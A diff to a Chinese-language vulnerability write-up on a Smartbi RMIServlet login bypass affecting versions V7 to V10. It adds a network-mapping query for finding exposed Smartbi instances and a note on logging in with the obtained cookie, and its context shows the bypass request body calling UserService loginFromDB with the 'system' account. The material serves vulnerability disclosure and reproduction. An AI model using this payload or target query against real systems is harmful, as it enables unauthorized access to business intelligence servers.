@@ -1,4 +1,4 @@
-# Smartbi 登录绕过漏洞
+# Smartbi RMIServlet 登陆绕过漏洞
 
 ## 漏洞描述
 
@@ -8,6 +8,12 @@
 
 ```
 V7 <= Smartbi <=V10
+```
+
+## 网络测绘
+
+```
+app="SMARTBI"
 ```
 
 ## 漏洞复现
@@ -33,6 +39,8 @@ Content-Type: application/x-www-form-urlencoded
  
 className=UserService&methodName=loginFromDB&params=["system","0a"]
 ```
+
+通过获取的Cookie登陆。
 
 ## 漏洞修复
 
